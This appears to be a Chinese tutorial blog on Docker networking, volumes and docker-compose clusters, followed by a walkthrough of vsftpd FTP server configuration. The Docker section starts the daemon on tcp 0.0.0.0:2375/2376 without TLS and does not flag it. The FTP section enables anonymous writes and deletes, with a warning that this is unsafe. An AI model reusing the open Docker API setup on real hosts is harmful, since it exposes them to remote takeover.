6.网络的none和hostnone 应用场景:安全性要求极高，存储绝密数据等 1234指定网络模式为none docker run -it --name none1 --restart=always --network none -d centos这里面只有127.0.0.1这个ip ,只能ping通自己，其他都不能ping通 host网络 123docker run -it --name host1 --restart=always --network host -d centos网络和宿主机一样。 7.多容器部署和应用flask 做web服务，redis做自增 8.多机器多容器通信1.利用etcd实现多机的ip管理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162etcd思路: 下载etcdwget https://github.com/coreos/etcd/releases/download/v3.0.12/etcd-v3.0.12-linux-amd64.tar.gzetcd启动命令(node01) 注意修改ipnohup ./etcd --name docker-node1 --initial-advertise-peer-urls http://192.168.224.11:2380 \\--listen-peer-urls http://192.168.224.11:2380 \\--listen-client-urls http://192.168.224.11:2379,http://127.0.0.1:2379 \\--advertise-client-urls http://192.168.224.11:2379 \\--initial-cluster-token etcd-cluster \\--initial-cluster docker-node1=http://192.168.224.11:2380,docker-node2=http://192.168.224.12:2380 \\--initial-cluster-state new&amp;etcd启动命令(node02) 注意修改ipnohup ./etcd --name docker-node2 --initial-advertise-peer-urls http://192.168.224.12:2380 \\--listen-peer-urls http://192.168.224.12:2380 \\--listen-client-urls http://192.168.224.12:2379,http://127.0.0.1:2379 \\--advertise-client-urls http://192.168.224.12:2379 \\--initial-cluster-token etcd-cluster \\--initial-cluster docker-node1=http://192.168.224.11:2380,docker-node2=http://192.168.224.12:2380 \\--initial-cluster-state new&amp;参数说明： ● –data-dir 指定节点的数据存储目录，若不指定，则默认是当前目录。这些数据包括节点ID，集群ID，集群初始化配置，Snapshot文件，若未指 定–wal-dir，还会存储WAL文件 ● –wal-dir 指定节点的was文件存储目录，若指定了该参数，wal文件会和其他数据文件分开存储 ● –name 节点名称 ● –initial-advertise-peer-urls 告知集群其他节点的URL，tcp2380端口用于集群通信 ● –listen-peer-urls 监听URL，用于与其他节点通讯 ● –advertise-client-urls 告知客户端的URL, 也就是服务的URL，tcp2379端口用于监听客户端请求 ● –initial-cluster-token 集群的ID ● –initial-cluster 集群中所有节点 ● –initial-cluster-state 集群状态，new为新创建集群，existing为已存在的集群查看端口有没有正常起来netstat -putnel查看集群状态./etcdctl cluster-healthdocker启动命令(node01) 先停止下docker/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock --cluster-store=etcd://192.168.224.11:2379 --cluster-advertise=192.168.224.11:2375&amp;docker启动命令(node02) 先停止下docker/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock --cluster-store=etcd://192.168.224.12:2379 --cluster-advertise=192.168.224.12:2375&amp;测试下集群网络在node01节点创建overlay网络，名为demodocker network create -d overlay demo这时候去node2节点看docker network ls 查看是否也有demo这个网络，有就说明可以了开始在node01运行容器docker run -it --name test1 --restart=always --net demo -d centos在node02运行一台，容器名不要和node01的重复docker run -it --name test2 --restart=always --net demo -d centos这时候进去容器。两台机器上的容器都可以互相ping通了docker exec -it test1 /bin/bashping test2 2.利用consul服务管理方法一 1234567891011121314151617181920212223242526272829303132331.启动 consul服务，实现网络的统一配置管理docker run --name consul -p 8500:8500 -h consul -d progrium/consul -server -bootstrapconsul: kv类型的存储数据库(key:value)docker01和docker02服务器上:vim /etc/docker/daemon.json{&quot;live-restore&quot;:true ,&quot;host&quot;:[&quot;tcp://0.0.0.0:2376&quot;,&quot;unix:///var/run/docker.sock&quot;],&quot;cluster-store&quot;:&quot;consul://192.168.224.11:8500&quot;,&quot;cluster-advertise&quot;:&quot;ens33:2376&quot;}cluster-store：配置的Consul的leader地址，单体直接写，其它软件注意协议cluster-advertise: 指定监听的网卡和端口，也可以指定接收订阅消息的IP:PORTsystemctl daemon-reloadsystemctl restart docker2. 创建overlay网络docker network create -d overlay --subnet 172.16.0.0/24 --gateway 172.16.0.254 over_1docker network ls 会发现两台服务器上都多了一个网络over_13. 启动容器测试docker run -it --name luke01 -h luke1 --network over_1 -d centos docker run -it --name luke02 -h luke2 --network over_1 -d centos进入容器测试docker container exec -it luke01 /bin/bashping luke02 可以ping通 他们都可以互相ping通每个容器有两块网卡，eth0实现容器间的通讯，eth1实现容器访问外网 容器默认路由是走eth1。docker会创建一个bridge网络“docker_gwbridge”，为所有连接到overlay网络的容器提供访问外网的能力 ： 方法二 12345678910111213141516171819202122232425262728291.网卡名ens33vim /etc/docker/daemon.json{ &quot;live-restore&quot;:true ,&quot;cluster-store&quot;:&quot;consul://192.168.224.11:8500&quot;,&quot;cluster-advertise&quot;:&quot;ens33:2376&quot; }接着执行命令，重启docker服务，另一台服务器操作方式相同，注意网卡名称sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker2.在11上启动consuldocker run --name consul -p 8500:8500 -h consul -d consul:1.5.23.创建Docker overlay共享网络$ docker network create -d overlay my_overlay访问192.168.224.11:8500key/value 会出现相关节点信息4. 启动容器测试docker run -it --name luke01 -h luke1 --network my_overlay -d centos docker run -it --name luke02 -h luke2 --network my_overlay -d centos进入容器测试docker container exec -it luke01 /bin/bashping luke02 可以ping通 他们都可以互相ping通每个容器有两块网卡，eth0实现容器间的通讯，eth1实现容器访问外网 容器默认路由是走eth1。docker会创建一个bridge网络“docker_gwbridge”，为所有连接到overlay网络的容器提供访问外网的能力 ： 5.docker容器数据持久化本地挂载1.数据持久化引入 12官方mysql数据存储文档https://hub.docker.com/_/mysql 在主机系统上的适当卷上创建数据目录，例如/my/own/datadir。 mysql像这样启动容器： 1docker run --name some-mysql -v /my/own/datadir:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql 该-v /my/own/datadir:/var/lib/mysql命令的一部分/my/own/datadir从底层主机系统/var/lib/mysql在容器内部安装目录，默认情况下，MySQL将在该目录中写入其数据文件。 2.数据卷容器 123456789101112131415161.宿主机模拟数据目录mkdir -p /opt/volume/amkdir -p /opt/volume/btouch /opt/volume/a/a.txttouch /opt/volume/b/b.txt2.启动数据卷容器docker container run -it --restart=always --name nginx_volumes -v /opt/volume/a:/opt/a -v /opt/volume/b:/opt/b -d centos3.使用数据卷容器docker run -d -p 8085:80 --volumes-from nginx_volumes --restart=always --name nginx_5 nginxdocker run -d -p 8086:80 --volumes-from nginx_volumes --restart=always --name nginx_6 nginx这样有多个目录需要挂载就可以使用这种方式。作用: 在集中管理集群中。大批量的容器都需要挂载相同的多个数据卷时，可以采用数据卷容器进行统一管理。 6，volume卷管理docker volume 可以理解成一个container中的磁盘,既可以跟随container的生命周期（在Dockerfile 中定义使用VOLUME关键字），也可以单独创建，永久存储，直到用docker volume rm 命令删除。 1.查看volume 1docker volume ls 2.创建volume 123456789docker volume create [options] 卷名 options选项有两个参数 -d 指定存储设备，默认是local -o 直接卷的存储路径 默认是 map[]示例1: docker volume create -d local-persist -o mountpoint=/data/nginx --name=nginxroot示例2: 参数默认 docker volume create vo_logs 这时候卷的存放路径是/var/lib/docker/volumes/vo_logs/_data 3.查看volume的详细信息 1docker volume inspect vo_logs 4.删除卷 1234567docker volume rm -f vo_logs -f 表示强制删除 docker volume prune [options]删除未被任何容器使用的本地卷 --filter 提供过滤值-f , --force 不提示确认信息，直接删除 5.卷的使用 1234567docker run -t --name mysql --restart=always -p 3306:3306 -v myvoluem:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=mypassword -d mysql这时候容器里的/var/lib/mysql的数据就存在myvoluem这个数据卷里了，第二种是本地挂载绑定宿主目录的概念很容易理解，就是将宿主目录绑定到容器中的某个目录位置。这样容器可以直接访问宿主目录的文件。其形式是docker run --name some-mysql -v /my/own/datadir:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql 挂载nginx 1234567891.创建nginx家目录存储卷docker volume create -d local-persist -o mountpoint=/data/nginx --name=nginxroot2.创建nginx配置目录存储卷 docker volume create -d local-persist -o mountpoint=/data/nginxconf --name=nginxconf 3.启动容器并挂载卷 docker run -it --name nginx1 --restart=always -p 8080:80 -v nginxroot:/usr/share/nginx/html -v nginxconf:/etc/nginx -d nginx 4.这时候修改配置文件就可以直接在物理机修改就可以了 6.卷和挂载目录有什么区别？ 卷 (Docker Volume) 是受控存储，是由 Docker 引擎进行管理维护的。因此使用卷，你可以不必处理 uid、SELinux 等各种权限问题，Docker 引擎在建立卷时会自动添加安全规则，以及根据挂载点调整权限。并且可以统一列表、添加、删除。另外，除了本地卷外，还支持网络卷、分布式卷。 而挂载目录那就没人管了，属于用户自行维护。你就必须手动处理所有权限问题。特别是在 CentOS 上，很多人碰到 Permission Denied，就是因为没有使用卷，而是挂载目录，而且还对 SELinux 安全权限一无所知导致。 3,docker-compose 多容器部署1.安装1234567方法一：curl -L https://github.com/docker/compose/releases/download/1.26.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose或者：curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose 查看版本信息 1# docker-compose --version 但是此方法会经常因为网络的原因而无法安装 方法二： 1、安装python-pip 123yum -y install epel-releaseyum -y install python-pip 2、安装docker-compose 1pip install docker-compose 待安装完成后，执行查询版本的命令， 1docker-compose version 2.docker-compose用法官方文档 1https://docs.docker.com/compose/ 常用选项： –verbose：输出更多的调试信息 –version：查看compose的版本 -f –file FILE：使用特定的compose模板文件，默认为docker-compose.yml。 -p –project-name NAME 指定项目名称，默认使用目录名称。 常用命令： down: 停止并删除容器、网络、镜像和卷 build：构建或重建服务 ps：查看已经启动的服务状态 kill：停止某个服务、杀掉容器 logs：可以查看某个服务的log、显示容器的输出内容 port：打印绑定的public port（开放端口） pull：拉取服务镜像 up：启动yml定义的所有服务 stop：停止yml中定义的所有服务 start：启动被停止的yml中的所有服务 kill：强行停止yml中定义的所有服务 rm：删除yml中定义的所有服务 restart：重启yml中定义的所有服务 scale：设置服务的容器数目 run:运行一个一次性命令 docker-compose up -d nginx 构建建启动nignx容器 在后台运行 docker-compose exec nginx bash 登录到nginx容器中 docker-compose down 删除所有容器,镜像 docker-compose ps 显示所有容器 docker-compose restart nginx 重新启动nginx容器 docker-compose run –no-deps –rm php-fpm php -v 在php-fpm中不启动关联容器，并容器执行php -v 执行完成后删除容器 docker-compose build nginx 构建镜像 。 docker-compose build –no-cache nginx 不带缓存的构建。 docker-compose logs nginx 查看nginx的日志 docker-compose logs -f nginx 查看nginx的实时日志 3.YAML简介​ Yaml简介.YAML是一种标记语言,可读性很强。类似于XML数据描述语言,语法比XML简单的多。YAML数据结构通过缩进来表示,连续的项目通过减号来表示,键值对用冒号分割,数组用括号括起来, hash用花括号括起来。 YAML文件格式注意事项: 在缩排中空白字符的数目并不是非常重要,只要相同阶层的元素左侧对齐就可以了(不过不能使用TAB字符); 通常开头缩进2个空格;字符的后面缩进1个空格,比如冒号、逗号、横杆; 支持#注释； 允许在文件中加入选择性的空行,以增加可读性; 可以看到一份标准配置文件应该包含 version、services、networks、volumes 四大部分，其中最关键的就是 services 和 networks 两个部分，下面先来看 services 的书写规则。 示例：创建4台centos容器。在同一个网络，有挂载。 123456789101112131415161718192021222324252627282930313233343536373839404142434445version: '3'services: centos: image: centos restart: always hostname: centos container_name: centos ports: - 80:80 networks: - nginx centos1: image: centos restart: always hostname: centos1 container_name: centos1 networks: - nginx command: - yum install -y epel-release &amp;&amp; yum install -y nginx volumes: - nginx:/usr/share/nginx/html - nginx:/etc/nginx centos2: image: centos restart: always hostname: centos2 container_name: centos2 networks: - nginx centos3: image: centos restart: always hostname: centos3 container_name: centos3 networks: - nginxnetworks: nginx: driver: bridgevolumes: nginx: driver: local-persist driver_opts: mountpoint: /data/nginx 4.docker-compose中YAML常用的字段： 字段 描述 version: ‘3’ 表示当前yaml文件版本 build dockerfile context 指定dockerfile文件名构建镜像上下文路径 services 相当于容器服务 image 指定镜像 restart 重启策略，默认no，always|on-failurel|unless-stopped hostname 容器主机名 command 执行命令，覆盖默认命令 container_name 指定容器名称，由于容器名称是唯一的，如果指定自定义名称，则无法scale ports 暴漏端口，与-p相同，但端口不能低于60 environment 添加环境变量 networks 加入网络，引用顶级networks下条目 extra_hosts 添加主机名的标签，就是往/etc/hosts文件中添加一些记录，与Docker client的–add-host类似： volumes 挂载宿主机路径或命名卷在顶级volumes定义卷名称 deploy 指定部署和运行服务相关配置，只能在Swarm模式使用 depends_on 这个标签解决了容器的依赖、启动先后的问题。 1234567Docker容器的重启策略如下：restartno，默认策略，在容器退出时不重启容器on-failure，在容器非正常退出时（退出状态非0），才会重启容器on-failure:3，在容器非正常退出时重启容器，最多重启3次always，在容器退出时总是重启容器unless-stopped，在容器退出时总是重启容器，但是不考虑在Docker守护进程启动时就已经停止了的容器 关于networks 123456 networks: - my-bridge #此容器用的my-bridge网络networks: my-bridge: #创建的网络名称 driver: bridge #网络模式为桥接 关于volumes 12345678910111213141516使用卷： volumes: - data01:/var/lib/mysql创建卷:volumes: data01: driver: local-persist driver_opts: mountpoint: /data/a data10: driver: local-persist driver_opts: mountpoint: /data/bdata01为卷的名字。 /data/a为卷的物理路径。 示列 docker-compose -f docker-compose.yml up 启动 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187version: '3'services: zoo1: image: zookeeper restart: unless-stopped hostname: zoo1 ports: - &quot;2181:2181&quot; - &quot;2881:2888&quot; - &quot;3881:3888&quot; container_name: zookeeper networks: zoo_net: ipv4_address: 172.18.0.2 extra_hosts: - &quot;zoo1:172.18.0.2&quot; - &quot;zoo2:172.18.0.3&quot; - &quot;zoo3:172.18.0.4&quot; volumes: - &quot;/root/kafka/zoo1data:/data&quot; - &quot;/root/kafka/zoo1data_log:/datalog&quot; environment: ZOO_MY_ID: 1 ZOO_SERVERS: server.1=zoo1:2881:3881;2181 server.2=zoo2:2882:3882;2181 server.3=zoo3:2883:3883;2181 zoo2: image: zookeeper restart: unless-stopped hostname: zoo2 container_name: zookeeper2 networks: zoo_net: ipv4_address: 172.18.0.3 extra_hosts: - &quot;zoo1:172.18.0.2&quot; - &quot;zoo2:172.18.0.3&quot; - &quot;zoo3:172.18.0.4&quot; ports: - &quot;2182:2181&quot; - &quot;2882:2888&quot; - &quot;3882:3888&quot; volumes: - &quot;/root/kafka/zoo2data:/data&quot; - &quot;/root/kafka/zoo2data_log:/datalog&quot; environment: ZOO_MY_ID: 2 ZOO_SERVERS: server.1=zoo1:2881:3881;2181 server.2=zoo2:2882:3882;2181 server.3=zoo3:2883:3883;2181 zoo3: image: zookeeper restart: unless-stopped hostname: zoo3 container_name: zookeeper3 networks: zoo_net: ipv4_address: 172.18.0.4 extra_hosts: - &quot;zoo1:172.18.0.2&quot; - &quot;zoo2:172.18.0.3&quot; - &quot;zoo3:172.18.0.4&quot; ports: - &quot;2183:2181&quot; - &quot;2883:2888&quot; - &quot;3883:3888&quot; volumes: - &quot;/root/kafka/zoo3data:/data&quot; - &quot;/root/kafka/zoo3data_log:/datalog&quot; environment: ZOO_MY_ID: 3 ZOO_SERVERS: server.1=zoo1:2881:3881;2181 server.2=zoo2:2882:3882;2181 server.3=zoo3:2883:3883;2181 kafka1: image: wurstmeister/kafka ports: - &quot;9092:9092&quot; extra_hosts: - &quot;zoo1:172.18.0.2&quot; - &quot;zoo2:172.18.0.3&quot; - &quot;zoo3:172.18.0.4&quot; networks: - zoo_net restart: always environment: KAFKA_ADVERTISED_HOST_NAME: 192.161.87.218 ## 修改:宿主机IP KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://192.161.87.218:9092 ## 修改:宿主机IP KAFKA_ZOOKEEPER_CONNECT: &quot;zoo1:2181&quot; KAFKA_ADVERTISED_PORT: 9092 KAFKA_BROKER_ID: 1 KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 3 volumes: - &quot;/root/kafka/kafka1-data:/kafka&quot; depends_on: - zoo1 container_name: kafka1 kafka2: image: wurstmeister/kafka networks: - zoo_net restart: always ports: - &quot;9093:9092&quot; extra_hosts: - &quot;zoo1:172.18.0.2&quot; - &quot;zoo2:172.18.0.3&quot; - &quot;zoo3:172.18.0.4&quot; volumes: - &quot;/root/kafka/kafka2-data:/kafka&quot; environment: KAFKA_ADVERTISED_HOST_NAME: 192.161.87.218 ## 修改:宿主机IP KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://192.161.87.218:9093 ## 修改:宿主机IP KAFKA_ZOOKEEPER_CONNECT: &quot;zoo1:2181&quot; KAFKA_ADVERTISED_PORT: 9093 KAFKA_BROKER_ID: 2 KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 3 depends_on: - zoo1 container_name: kafka2 kafka3: image: wurstmeister/kafka ports: - &quot;9094:9092&quot; restart: always extra_hosts: - &quot;zoo1:172.18.0.2&quot; - &quot;zoo2:172.18.0.3&quot; - &quot;zoo3:172.18.0.4&quot; volumes: - &quot;/root/kafka/kafka3-data:/kafka&quot; networks: - zoo_net environment: KAFKA_ADVERTISED_HOST_NAME: 192.161.87.218 ## 修改:宿主机IP KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://192.161.87.218:9094 ## 修改:宿主机IP KAFKA_ZOOKEEPER_CONNECT: &quot;zoo1:2181&quot; KAFKA_ADVERTISED_PORT: 9094 KAFKA_BROKER_ID: 3 KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 3 depends_on: - zoo1 container_name: kafka3 kafka4: image: wurstmeister/kafka ports: - &quot;9095:9092&quot; restart: always extra_hosts: - &quot;zoo1:172.18.0.2&quot; - &quot;zoo2:172.18.0.3&quot; - &quot;zoo3:172.18.0.4&quot; volumes: - &quot;/root/kafka/kafka4-data:/kafka&quot; networks: - zoo_net environment: KAFKA_ADVERTISED_HOST_NAME: 192.161.87.218 ## 修改:宿主机IP KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://192.161.87.218:9095 ## 修改:宿主机IP KAFKA_ZOOKEEPER_CONNECT: &quot;zoo1:2181&quot; KAFKA_ADVERTISED_PORT: 9095 KAFKA_BROKER_ID: 4 KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 3 depends_on: - zoo1 container_name: kafka4 kafka-manager: image: sheepkiller/kafka-manager ## 镜像：开源的web管理kafka集群的界面 networks: - zoo_net environment: ZK_HOSTS: 192.161.87.218 ## 修改:宿主机IP ports: - &quot;9000:9000&quot; ## 暴露端口 depends_on: - kafka3networks: zoo_net: ipam: config: - subnet: 172.18.0.0/16","link":"/2020/08/04/docker%E4%BD%BF%E7%94%A8/"},{"title":"ftp","text":"FTP文件传输协议 成本低，跨平台,跨公网 file transfer protocol 使用的端口号： 数据传输端口 20 –用于数据的上传和下载 命令传输端口 21 –用于ftp命令的传输 ftp的两种模式：主动：默认情况下，ftp服务是开放了21端口，用来接受控制命令，服务器用20端口去发送数据（连接客户端大于1024的随机端口） 被动：ftp服务也是开放21端口，用来接受命令控制，进行数据传输时，客户端会告知服务端打开一个大于1024的端口，然后客户端去主动连接服务 主动好还是被动好? 先假设一种场景：客户端用户安装个人防火墙，但又不懂防火墙的配置，所以防火墙默认配置。个人防火墙的默认一般只会拒绝进来的包，而不会拒绝你出去的包和你出去再回来的包。所以上面的主动模式是有可能被拒绝掉的 主动ftp对ftp服务器的管理有利，但对客户端的管理不利。因为是服务端主动与客户端去建立连接，可能会被客户端的防火墙把源来自服务器的包给阻塞掉 被动ftp对ftp客户端的管理有利，但对服务端的管理不利。因为客户端主动与服务端去连，可能会被服务端的防火墙给阻塞掉 折衷的方法就是使用被动模式，并指定一个连接过来的端口范围，可以针对这个范围的端口进行一个防火墙的设置。 –（到iptables课程会介绍） 安装服务： 123456789101112yum install vsftpd -y #服务端yum install ftp lftp -y #客户端systemctl start vsftpdsystemctl enable vsftpdnetstat -ntl |grep ：21 #现在是只能看到监听21端口tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN lsof -i:21COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEvsftpd 3321 root 3u IPv4 21400 0t0 TCP *:ftp (LISTEN) ftp的匿名用户ftp #系统用户，/etc/passwd里有此用户，默认进入ftp用户的家目录anonymous #系统中无此用户(匿名)，默认进入/var/ftp ftp的工作模式解析：vsftpd默认的工作模式是被动模式 验证主动模式： ftp 192.168.224.12 #自己做客户端,连接自己的服务端Connected to 192.168.224.12.220 (vsFTPd 2.0.5)530 Please login with USER and PASS.530 Please login with USER and PASS.KERBEROS_V4 rejected as an authentication typeName (192.168.224.12:root): ftp #输入匿名用户ftp331 Please specify the password.Password: #它的密码任意或者为空230 Login successful. ftp&gt; ? #使用?号可以查看能使用哪些命令ftp&gt; help passive #help+命令可以查看命令的帮助passive toggle passive transfer modeftp&gt; passive #使用passive命令关闭被动模式Passive mode off. ftp&gt;ls #建立数据链路（列出当前ftp家目录中的内容） 1234200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 0 0 4096 May 13 2009 pub226 Directory send OK. ftp&gt; get #下载文件 ftp&gt; put #上传文件 可以在服务器端创建新文件，然后在客户端使用get来获取文件。 在服务器打开第二个终端验证netstat -nt |grep TIME_ #可以看到是服务端的20端口去连客户端的大于1024的随机端口tcp 0 0 192.168.224.12:20 192.168.224.12:56227 TIME_WAITnetstat -nt |grep TIME_tcp 0 0 192.168.224.12:20959 10.0.0.20:36261 TIME_WAITtcp 0 0 192.168.224.12:10084 10.0.0.20:52731 TIME_WAITtcp 0 0 192.168.224.12:11956 192.168.224.12:48358 TIME_WAIT ftp登录补充:1.输入ftp命令后登录指定机器ftpftp &gt; open 192.168.224.12 #指定连接224.12的服务端 2.登录出错后重新登录ftp匿名用户 123456789101112ftp 192.168.224.12Connected to 192.168.224.12 (192.168.224.12).220 (vsFTPd 3.0.2)Name (127.0.0.1:root): abc #没有abc用户331 Please specify the password.Password:530 Login incorrect.Login failed. #登录出错ftp&gt; use ftp331 Please specify the password.Password: 230 Login successful. =============================================================== 配置文件参数说明：cat /etc/vsftpd/vsftpd.conf |grep -Ev &quot;^#|^$&quot; ^#代表以#开头的行，也就是注释； ^$代表空行 123456789101112anonymous_enable=YES #是否允许匿名用户登录local_enable=YES #是否允许本地用户登录write_enable=YES #是否允许本地用户登录后可写local_umask=022 #建立文件或者目录的权限掩码dirmessage_enable=YES #开启访问目录的提示信息xferlog_enable=YES #是否打开日志功能 （只记录文件的上传和下载信息）connect_from_port_20=YES #默认支持主动模式（两个模式都是开启的，直接使用的话是使用的被动模式） xferlog_std_format=YES #日志使用xferlog而不是vsftpd.log，改为NO的话，则相反listen=YES #默认是&quot;yes&quot;，以独立服务运行；pam_service_name=vsftpd #使用pam(Pluggable Authentication Modules)完成用户认证userlist_enable=YES #打开用户列表的功能tcp_wrappers=YES ====================================== 配置实例： 例一：不允许匿名用户登录 12345vim /etc/vsftpd/vsftpd.confanonymous_enable=NO #改为no匿名用户有两个：ftp 密码为任意值或空 anonymous 密码为任意值或空 systemctl restart vsftpd 使用匿名用户登录测试，发现登录不了 例二:匿名用户的下载 12vim /etc/vsftpd/vsftpd.confanonymous_enable=YES #改回yes 默认使用匿名用户登录的服务端的/var/ftp目录下，因为/etc/passwd里的ftp用户的家目录就是/var/ftp，所以其实就是登录到它的家目录 匿名用户默认是可以登录，也可以下载，因为/var/ftp是755权限ftp &gt; get 123.txt 能读表示能下载，能写表示能上传 chmod 750 /var/ftp后使用匿名用户登录,ls都看不到文件列表，也下载不了 chmod 754 /var/ftp后使用匿名用户登录,ls都看不到文件列表，也下载不了,因为不能cd到/var/ftp chmod 751 /var/ftp 后使用匿名用户登录,ls都看不到文件列表，但是可以下载；因为它能cd到/var/ftp，ls虽然看不到，但get 文件名，是可以下载下来的 还要注意文件的权限对其是否能被下载也有关系，要登录用户对其有r权限，才可以下载 例三：匿名用户的上传 默认是不允许匿名用户上传的ftp&gt; put 1local: 1 remote: 1227 Entering Passive Mode (10,1,1,45,135,67)550 Permission denied. #权限拒绝，因为/var/ftp不允许ftp用户写 chmod 777 /var/ftp Name (10.0.0.45:root): ftp331 Please specify the password.Password:500 OOPS: vsftpd: refusing to run with writable anonymous rootLogin failed. #/var/ftp被改为777后，发现登录不了，所以还得改回去755 因为ftp服务本身不允许系统权限给匿名写，所以解决方法是在登录目录，再去创建一个用于上传的目录，给一个写权限 12chmod 755 /var/ftpchmod 777 /var/ftp/pub #把pub改为可写，用于上传 ftp&gt; cd pub250 Directory successfully changed.ftp&gt; put 1local: 1 remote: 1227 Entering Passive Mode (10,1,1,45,232,229)550 Permission denied. #但还是权限拒绝 因为系统权限允许了，但是服务本身的权限还是不允许，所以要去改服务的配置参数 12345vim /etc/vsftpd/vsftpd.confanonymous_enable=YESanon_upload_enable=YES #允许匿名用户上传文件 原本是注释的，打开注释就可以了。anon_mkdir_write_enable=YES #允许匿名用户创建目录 总结：匿名用户只能对登录目录内的子目录里面进行上传，并且对这个子目录要有w权限，还要有anon_upload_enable=YES 和 anon_mkdir_write_enable=YES 的支持就可以上传了 匿名用户登录后可以删除文件和重命名文件 12vim /etc/vsftpd/vsftpd.confanon_other_write_enable=yes #加上此参数，再重启服务； ftp &gt; delete xxxftp &gt; rename mbr.bak mbrftp &gt; mkdir aaa 加上这个参数后，家目录里的文件不能删，但子目录里的可以 实际环境中不建议使用此参数，太不安全了,包括上面允许匿名写也是不安全的 例四：允许匿名下载刚上传的文件 为什么默认不允许下载自己上传的文件？文件上传之后权限自动改为600,而默认情况下anon_world_readable_only=YES，规定了匿名用户只能下载当前用户拥有读权限的文件对于600权限文件是没有权限下载 -rw——- 1 14 50 845 Jul 19 06:12 fstab 不可以-rw-r–r– 1 0 0 1666 Jul 19 06:13 inittab 可以 方法一：让匿名帐号上传的文件权限自动更改为644的权限man vsftpd.conf vim /etc/vsftpd/vsftpd.confanon_umask=022如果要文件上传后的权限是444 ,umask怎么设定?anon_umask=0222 方法二：允许匿名帐号下载不是所有人都可以读的文件vim /etc/vsftpd/vsftpd.confanon_world_readable_only=NO #允许下载只读文件 例五：关于普通用户（系统的普通用户)的登录 普通用户默认是允许登录ftp的，并且是登录到自己的家目录，登录密码也就是普通用户登录系统的密码 禁止普通用户登录 方法一： 12vim /etc/vsftpd/vsftpd.conflocal_enable=NO #禁止所有系统用户登录FTP 方法二：/etc/passwd 里把普通用户最后一列，改为/bin/false 123/bin/bash #可以登录系统，也可以登录ftp，也可以收邮件/sbin/nologin #不可以登录系统，但可以登录ftp,也可以收邮件/bin/false #不可以登录系统，又不可以登录ftp，可以收邮件 例六：使用用户列表来控制用户登录FTP 建议使用这种方式 黑名单 1234 vim /etc/vsftpd/vsftpd.confuserlist_enable=yes #打开用户列表功能，默认就是打开的userlist_deny=YES #加上这句，启用黑名单 vim /etc/vsftpd/user_list #加上要禁止的用户，一个用户写一行 白名单 userlist_enable=yes userlist_deny=no vim /etc/vsftpd/user_list #加上允许的用户，一个用户写一行 在服务端创建一个普通用户来进行ftp的上传和下载。 12useradd yichen #创建普通用户。passwd yichen #为普通用户创建密码。 #上面的主要要注意的是： userlist_enable 指定的是用户列表功能是否有效 userlit_deny 指定的是用户列表是允许登录还是拒绝登录 #pam默认也把root和一些系统用户（uid小于500的）给禁用了。vim /etc/vsftpd/ftpusers 如果把/etc/pam.d/vsftpd 文件中第二行的sense=deny 改为allow，则表示/etc/vsftpd/ftpusers文件里的用户pam是允许登录的 如果允许root用户登录ftp，则要/etc/vsftpd/user_list和/etc/vsftpd/ftpusers都不要禁用root登录ftp就可以了。但为了安全，不会这样去开放root用户的 例七：关于普通用户的下载和上传1.默认是允许下载和上传的,允许上传除了系统目录有写权限外，还有与服务的参数write_enable=YES有关 2.所有的本地用户（非匿名用户）登录后，都统一登录到/ftpdata/目录下 1.把所有的用户家目录改成/ftpdata/。但这样做会影响到系统用户登录到自己的家目录 2.使用下面的参数，它不影响你系统用户登录到自己的家目录 vim /etc/vsftpd/vsftpd.conf local_root=/ftpdata 例八：关于chroot（cage笼环境,jail监牢） #为了增强安全性，把用户活动范围锁定到登录的目录里 默认情况下，普通用户（匿名用户除外）可以登录ftp后，cd切换到/下的任何地方，只要有r权限，就可以get文件，那么显然是不安全的 123vim /etc/vsftpd/vsftpd.confchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_list vim /etc/vsftpd/chroot_list #手动创建这个文件，默认不存在，并写上要加入笼环境的用户名，一行写一个 systemctl restart vsftpd 测试发现,有笼环境的用户ftp登录后，cd .. 还是在它的登录目录，出不去了 例九：vsftpd托管super daemonnetstat -ntlup |grep :21tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 3460/vsftpd vim /etc/xinetd.d/vsftp 12345678910service ftp{ socket_type = stream protocol = tcp wait = no user = root server = /usr/sbin/vsftpd disable = no} systemctl stop vsftpd systemctl restart xinetd 123netstat -ntlup |grep 21 tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 3486/xinetd #由xinetd托管 ftp 192.168.224.12 #但是登录失败Connected to 192.168.224.12.421 Service not available, remote server has closed connectionftp&gt; 123vim /etc/vsftpd/vsftpd.conflisten=NO listen_ipv6=NO #要改为no systemctl restart xinetd ftp 192.168.224.12 #再次访问OK ======================================================================= 例十：被动连接模式，控制服务器数据传输端口的范围 vim /etc/vsftpd/vsftpd.conf在最后加上pasv_enable=YES #这一句默认不加也可以pasv_min_port=3000pasv_max_port=3005 #最小端口范围和最大端口范围可以自定义 #然后使用ftp 登录后，输入ls使之有数据传输，netstat -nt|grep 